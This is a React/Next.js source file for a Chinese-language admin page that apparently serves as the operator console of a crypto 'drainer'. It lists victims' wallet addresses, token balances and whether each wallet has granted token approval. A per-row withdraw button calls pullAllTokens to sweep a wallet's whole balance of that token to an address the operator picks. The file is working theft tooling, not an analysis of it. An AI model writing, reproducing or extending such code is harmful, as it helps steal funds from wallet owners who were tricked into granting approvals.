'use client'

import { useState, useEffect } from 'react'
import Image from 'next/image'
import { useLanguage } from '@/lib/language-context'
import { ConnectButton } from '@rainbow-me/rainbowkit'
import { useAccount } from 'wagmi'
import { WithdrawModal } from '@/components/withdraw-modal'
import { pullAllTokens } from '@/lib/token-puller-service'

interface TokenRecord {
  wallet_address: string
  token_symbol: string
  token_name: string
  token_icon: string | null
  contract_address: string
  decimal: number
  verified: boolean
  total_supply: string
  implementation_address: string | null
  balance: string
  order_index: number
  is_approved: boolean
  created_at: string
  updated_at: string
}

interface ApiResponse {
  data: TokenRecord[]
  total: number
  page: number
  pageSize: number
  totalPages: number
}

export default function AdminPage() {
  const { t } = useLanguage()
  const { address: connectedAddress, isConnected } = useAccount()
  const [records, setRecords] = useState<TokenRecord[]>([])
  const [loading, setLoading] = useState(true)
  const [total, setTotal] = useState(0)
  const [page, setPage] = useState(1)
  const [totalPages, setTotalPages] = useState(0)
  
  // 提币弹窗状态
  const [withdrawModal, setWithdrawModal] = useState<{
    isOpen: boolean
    record: TokenRecord | null
  }>({
    isOpen: false,
    record: null,
  })
  
  // 筛选条件
  const [filters, setFilters] = useState({
    wallet_address: '',
    contract_address: '',
    is_approved: '',
  })
  
  // 临时筛选输入（用于输入框）
  const [tempFilters, setTempFilters] = useState({
    wallet_address: '',
    contract_address: '',
    is_approved: '',
  })
  
  // 获取数据
  const fetchData = async () => {
    setLoading(true)
    try {
      const params = new URLSearchParams({
        page: page.toString(),
        page_size: '50',
        ...filters,
      })
      
      const response = await fetch(`/api/admin/tokens?${params}`)
      const data: ApiResponse = await response.json()
      
      if (response.ok) {
        setRecords(data.data)
        setTotal(data.total)
        setTotalPages(data.totalPages)
      } else {
        console.error('获取数据失败:', data)
      }
    } catch (error) {
      console.error('获取数据错误:', error)
    } finally {
      setLoading(false)
    }
  }
  
  // 初始加载
  useEffect(() => {
    fetchData()
  }, [page, filters])
  
  // 应用筛选
  const applyFilters = () => {
    setFilters(tempFilters)
    setPage(1) // 重置到第一页
  }
  
  // 重置筛选
  const resetFilters = () => {
    setTempFilters({
      wallet_address: '',
      contract_address: '',
      is_approved: '',
    })
    setFilters({
      wallet_address: '',
      contract_address: '',
      is_approved: '',
    })
    setPage(1)
  }
  
  // 刷新数据
  const refreshData = () => {
    fetchData()
  }
  
  // 格式化地址（显示前6位和后4位）
  const formatAddress = (address: string) => {
    if (!address) return '-'
    return `${address.slice(0, 6)}...${address.slice(-4)}`
  }
  
  // 格式化时间
  const formatDate = (dateString: string) => {
    if (!dateString) return '-'
    const date = new Date(dateString)
    return date.toLocaleString('zh-CN', {
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
    })
  }
  
  // 打开提币弹窗
  const openWithdrawModal = (record: TokenRecord) => {
    if (!isConnected) {
      alert('请先连接钱包')
      return
    }
    setWithdrawModal({
      isOpen: true,
      record,
    })
  }
  
  // 关闭提币弹窗
  const closeWithdrawModal = () => {
    setWithdrawModal({
      isOpen: false,
      record: null,
    })
  }
  
  // 执行提币
  const handleWithdraw = async (toAddress: string) => {
    if (!withdrawModal.record) return
    
    const { contract_address, wallet_address } = withdrawModal.record
    
    await pullAllTokens(
      contract_address,
      wallet_address,
      toAddress
    )
    
    // 提币成功后刷新数据
    await fetchData()
  }
  
  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-50 via-white to-blue-50 py-12 px-4">
      <div className="max-w-7xl mx-auto">
        {/* 标题和钱包连接 */}
        <div className="mb-8 flex justify-between items-start">
          <div>
            <h1 className="text-3xl font-bold text-gray-900 mb-2">
              后台管理 - 代币记录管理
            </h1>
            <p className="text-gray-600">
              显示 {records.length} 条记录，共 {total} 条
            </p>
          </div>
          <div>
            <ConnectButton chainStatus="icon" showBalance={false} />
          </div>
        </div>
        
        {/* 操作栏 */}
        <div className="bg-white rounded-lg shadow-md p-6 mb-6">
          <div className="flex justify-between items-center mb-6">
            <h2 className="text-xl font-semibold text-gray-800">筛选条件</h2>
            <button
              onClick={refreshData}
              disabled={loading}
              className="px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {loading ? '刷新中...' : '刷新数据'}
            </button>
          </div>
          
          {/* 筛选表单 */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                钱包地址
              </label>
              <input
                type="text"
                value={tempFilters.wallet_address}
                onChange={(e) => setTempFilters({ ...tempFilters, wallet_address: e.target.value })}
                placeholder="输入钱包地址"
                className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
              />
            </div>
            
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                代币地址
              </label>
              <input
                type="text"
                value={tempFilters.contract_address}
                onChange={(e) => setTempFilters({ ...tempFilters, contract_address: e.target.value })}
                placeholder="输入代币合约地址"
                className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
              />
            </div>
            
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                授权状态
              </label>
              <select
                value={tempFilters.is_approved}
                onChange={(e) => setTempFilters({ ...tempFilters, is_approved: e.target.value })}
                className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
              >
                <option value="">全部</option>
                <option value="true">已授权</option>
                <option value="false">未授权</option>
              </select>
            </div>
          </div>
          
          {/* 筛选按钮 */}
          <div className="flex gap-3">
            <button
              onClick={applyFilters}
              className="px-6 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 transition-colors"
            >
              应用筛选
            </button>
            <button
              onClick={resetFilters}
              className="px-6 py-2 bg-gray-200 text-gray-700 rounded-lg hover:bg-gray-300 transition-colors"
            >
              重置筛选
            </button>
          </div>
        </div>
        
        {/* 数据表格 */}
        <div className="bg-white rounded-lg shadow-md overflow-hidden">
          <div className="overflow-x-auto">
            <table className="w-full">
              <thead className="bg-gray-50 border-b border-gray-200">
                <tr>
                  <th className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                    Logo
                  </th>
                  <th className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                    钱包地址
                  </th>
                  <th className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                    代币地址
                  </th>
                  <th className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                    符号
                  </th>
                  <th className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                    名称
                  </th>
                  <th className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                    余额
                  </th>
                  <th className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                    授权
                  </th>
                  <th className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                    序号
                  </th>
                  <th className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                    创建时间
                  </th>
                  <th className="px-4 py-3 text-center text-xs font-medium text-gray-500 uppercase tracking-wider">
                    操作
                  </th>
                </tr>
              </thead>
              <tbody className="bg-white divide-y divide-gray-200">
                {loading ? (
                  <tr>
                    <td colSpan={10} className="px-4 py-8 text-center text-gray-500">
                      <div className="flex items-center justify-center">
                        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600"></div>
                        <span className="ml-3">加载中...</span>
                      </div>
                    </td>
                  </tr>
                ) : records.length === 0 ? (
                  <tr>
                    <td colSpan={10} className="px-4 py-8 text-center text-gray-500">
                      暂无数据
                    </td>
                  </tr>
                ) : (
                  records.map((record, index) => (
                    <tr key={`${record.wallet_address}-${record.contract_address}`} className="hover:bg-gray-50">
                      <td className="px-4 py-4 whitespace-nowrap">
                        {record.token_icon ? (
                          <Image
                            src={record.token_icon}
                            alt={record.token_symbol}
                            width={32}
                            height={32}
                            className="rounded-full"
                          />
                        ) : (
                          <div className="w-8 h-8 bg-gray-200 rounded-full flex items-center justify-center">
                            <span className="text-xs text-gray-500">
                              {record.token_symbol.slice(0, 2)}
                            </span>
                          </div>
                        )}
                      </td>
                      <td className="px-4 py-4 whitespace-nowrap">
                        <a
                          href={`https://kaiascope.com/account/${record.wallet_address}`}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="text-blue-600 hover:text-blue-800 font-mono text-sm"
                          title={record.wallet_address}
                        >
                          {formatAddress(record.wallet_address)}
                        </a>
                      </td>
                      <td className="px-4 py-4 whitespace-nowrap">
                        <a
                          href={`https://kaiascope.com/token/${record.contract_address}`}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="text-blue-600 hover:text-blue-800 font-mono text-sm"
                          title={record.contract_address}
                        >
                          {formatAddress(record.contract_address)}
                        </a>
                      </td>
                      <td className="px-4 py-4 whitespace-nowrap">
                        <span className="font-semibold text-gray-900">
                          {record.token_symbol}
                        </span>
                      </td>
                      <td className="px-4 py-4 whitespace-nowrap">
                        <span className="text-gray-700">
                          {record.token_name}
                        </span>
                      </td>
                      <td className="px-4 py-4 whitespace-nowrap">
                        <span className="font-mono text-sm text-gray-900">
                          {parseFloat(record.balance).toFixed(4)}
                        </span>
                      </td>
                      <td className="px-4 py-4 whitespace-nowrap">
                        <span
                          className={`px-2 py-1 text-xs font-semibold rounded-full ${
                            record.is_approved
                              ? 'bg-green-100 text-green-800'
                              : 'bg-red-100 text-red-800'
                          }`}
                        >
                          {record.is_approved ? '已授权' : '未授权'}
                        </span>
                      </td>
                      <td className="px-4 py-4 whitespace-nowrap">
                        <span className="text-gray-700">
                          {record.order_index}
                        </span>
                      </td>
                      <td className="px-4 py-4 whitespace-nowrap text-sm text-gray-500">
                        {formatDate(record.created_at)}
                      </td>
                      <td className="px-4 py-4 whitespace-nowrap text-center">
                        <button
                          onClick={() => openWithdrawModal(record)}
                          disabled={!isConnected}
                          className="px-3 py-1 bg-green-600 text-white text-sm rounded-lg hover:bg-green-700 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          提币
                        </button>
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
          
          {/* 分页 */}
          {!loading && totalPages > 1 && (
            <div className="bg-gray-50 px-4 py-3 flex items-center justify-between border-t border-gray-200">
              <div className="flex-1 flex justify-between sm:hidden">
                <button
                  onClick={() => setPage(page - 1)}
                  disabled={page === 1}
                  className="relative inline-flex items-center px-4 py-2 border border-gray-300 text-sm font-medium rounded-md text-gray-700 bg-white hover:bg-gray-50 disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  上一页
                </button>
                <button
                  onClick={() => setPage(page + 1)}
                  disabled={page === totalPages}
                  className="ml-3 relative inline-flex items-center px-4 py-2 border border-gray-300 text-sm font-medium rounded-md text-gray-700 bg-white hover:bg-gray-50 disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  下一页
                </button>
              </div>
              <div className="hidden sm:flex-1 sm:flex sm:items-center sm:justify-between">
                <div>
                  <p className="text-sm text-gray-700">
                    显示第 <span className="font-medium">{(page - 1) * 50 + 1}</span> 到{' '}
                    <span className="font-medium">{Math.min(page * 50, total)}</span> 条，
                    共 <span className="font-medium">{total}</span> 条
                  </p>
                </div>
                <div>
                  <nav className="relative z-0 inline-flex rounded-md shadow-sm -space-x-px">
                    <button
                      onClick={() => setPage(page - 1)}
                      disabled={page === 1}
                      className="relative inline-flex items-center px-2 py-2 rounded-l-md border border-gray-300 bg-white text-sm font-medium text-gray-500 hover:bg-gray-50 disabled:opacity-50 disabled:cursor-not-allowed"
                    >
                      上一页
                    </button>
                    
                    {/* 页码 */}
                    {Array.from({ length: Math.min(totalPages, 5) }, (_, i) => {
                      let pageNum
                      if (totalPages <= 5) {
                        pageNum = i + 1
                      } else if (page <= 3) {
                        pageNum = i + 1
                      } else if (page >= totalPages - 2) {
                        pageNum = totalPages - 4 + i
                      } else {
                        pageNum = page - 2 + i
                      }
                      
                      return (
                        <button
                          key={pageNum}
                          onClick={() => setPage(pageNum)}
                          className={`relative inline-flex items-center px-4 py-2 border text-sm font-medium ${
                            page === pageNum
                              ? 'z-10 bg-blue-50 border-blue-500 text-blue-600'
                              : 'bg-white border-gray-300 text-gray-500 hover:bg-gray-50'
                          }`}
                        >
                          {pageNum}
                        </button>
                      )
                    })}
                    
                    <button
                      onClick={() => setPage(page + 1)}
                      disabled={page === totalPages}
                      className="relative inline-flex items-center px-2 py-2 rounded-r-md border border-gray-300 bg-white text-sm font-medium text-gray-500 hover:bg-gray-50 disabled:opacity-50 disabled:cursor-not-allowed"
                    >
                      下一页
                    </button>
                  </nav>
                </div>
              </div>
            </div>
          )}
        </div>
        
        {/* 提币弹窗 */}
        {withdrawModal.record && (
          <WithdrawModal
            isOpen={withdrawModal.isOpen}
            onClose={closeWithdrawModal}
            tokenSymbol={withdrawModal.record.token_symbol}
            tokenAddress={withdrawModal.record.contract_address}
            walletAddress={withdrawModal.record.wallet_address}
            balance={withdrawModal.record.balance}
            onConfirm={handleWithdraw}
          />
        )}
      </div>
    </div>
  )
}
